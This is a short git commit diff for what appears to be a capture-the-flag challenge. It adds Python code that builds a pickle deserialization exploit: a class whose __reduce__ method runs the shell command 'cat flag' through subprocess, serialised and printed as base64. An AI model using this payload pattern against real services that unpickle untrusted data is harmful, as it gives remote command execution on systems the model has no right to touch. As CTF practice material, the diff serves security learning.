1736e0da4b27031d71955c4d7cfcaf746df41280
skoshta <shubhrakoshta@hotmail.com>
2025-02-27 11:08:12 -0600

    First commit for CTFChallenge

--- main.py
+++ main.py
@@ -1,5 +1,16 @@
+import pickle
+import base64
+import subprocess
+
+class Exploit(object):
+    def __reduce__(self):
+        return (subprocess.getoutput, ("cat flag",))
+
+
 def main():
     print("Testing CTF")
+    payload = pickle.dumps(Exploit(), protocol=2)
+    print(base64.b64encode(payload).decode())
 
 
 if __name__ == "__main__":
